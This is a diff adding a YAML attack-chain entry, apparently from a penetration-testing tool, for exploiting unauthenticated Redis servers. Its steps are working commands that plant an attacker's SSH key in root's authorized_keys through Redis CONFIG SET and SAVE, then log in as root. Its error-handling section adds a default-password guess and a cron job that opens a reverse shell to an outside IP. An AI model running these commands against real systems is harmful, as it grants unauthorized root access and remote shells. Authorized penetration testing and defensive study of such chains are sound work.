@@ -1,0 +1,60 @@
+chain_id: redis_no_auth
+title: "Redis — unauthenticated access to RCE via SSH key write"
+severity: CRITICAL
+tags: [redis, no-auth, rce, ssh]
+
+trigger:
+  any_of:
+    - { port: 6379 }
+    - { service: redis }
+    - { service_pattern: "(?i)redis" }
+
+description: |
+  Open Redis with no authentication is a one-shot to RCE on any internal
+  asset that allows network access. Two canonical paths:
+
+    - Write your SSH public key into root's authorized_keys, then ssh in.
+    - Schedule a malicious cron job by abusing the key dump to /var/spool/cron/root.
+
+  Both work because Redis lets clients pick the persistence directory and
+  filename, dropping any string at any path the redis user can write.
+
+steps:
+  - id: 1
+    title: "Confirm anonymous access"
+    command: redis-cli -h $VICTIMA INFO
+
+  - id: 2
+    title: "Generate an SSH keypair on Kali"
+    command: ssh-keygen -t rsa -b 4096 -N '' -f redis-rce -q
+
+  - id: 3
+    title: "Pad the key with newlines so Redis stores it cleanly"
+    command: |
+      (echo; echo; cat redis-rce.pub; echo; echo) > redis.txt
+
+  - id: 4
+    title: "Tell Redis to persist .ssh/authorized_keys"
+    command: |
+      cat redis.txt | redis-cli -h $VICTIMA -x SET pwn
+      redis-cli -h $VICTIMA CONFIG SET dir /root/.ssh/
+      redis-cli -h $VICTIMA CONFIG SET dbfilename "authorized_keys"
+      redis-cli -h $VICTIMA SAVE
+
+  - id: 5
+    title: "Connect over SSH"
+    command: ssh -i redis-rce root@$VICTIMA
+
+common_errors:
+  - error: "(error) NOAUTH Authentication required"
+    solution: |
+      Server requires AUTH. Try common defaults:
+        redis-cli -h $VICTIMA -a foobared INFO
+      If you have credentials, append `-a PASSWORD` to every command above.
+  - error: "Permission denied — /root/.ssh is read-only"
+    solution: |
+      Pivot to cron: CONFIG SET dir /var/spool/cron/, dbfilename root,
+      and seed pwn with `\n* * * * * bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'\n`.
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
